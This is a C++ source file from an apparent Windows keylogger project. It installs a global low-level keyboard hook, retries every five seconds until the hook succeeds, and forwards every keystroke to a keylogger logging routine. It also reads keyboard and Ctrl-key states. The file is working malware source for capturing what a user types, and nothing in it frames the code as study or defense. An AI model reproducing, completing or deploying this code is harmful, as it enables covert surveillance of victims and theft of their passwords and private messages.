#include "keyboard.h"
#include "keylogger.h"
#include "configuration.h"
#include <thread>
#include <chrono>

using namespace std::chrono_literals;

HHOOK hook;

LRESULT __stdcall hook_callback(int nCode, WPARAM wParam, LPARAM lParam) noexcept
{
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
        keylogger::log_kbd(reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam));
    }

    return CallNextHookEx(hook, nCode, wParam, lParam);
}

void keyboard::set_hook()
{
    hook = SetWindowsHookExW(WH_KEYBOARD_LL, hook_callback, NULL, 0);

    if (!hook)
    {
        std::this_thread::sleep_for(5s);
        set_hook();
    }
}

void keyboard::get_state(BYTE* keyboard_state) noexcept
{
    for (uint16_t i = 0; i < configuration::keyboard_state_size; i++)
    {
        const auto key_state = GetKeyState(i);

        keyboard_state[i] = key_state >> 8;
        keyboard_state[i] |= key_state;
    }
}

bool keyboard::is_control_down() noexcept
{
    return is_down(GetKeyState(VK_CONTROL)) || is_down(GetKeyState(VK_RCONTROL)) || is_down(GetKeyState(VK_LCONTROL));
}

constexpr bool keyboard::is_down(SHORT key_status) noexcept
{
    return key_status >> 15;
}
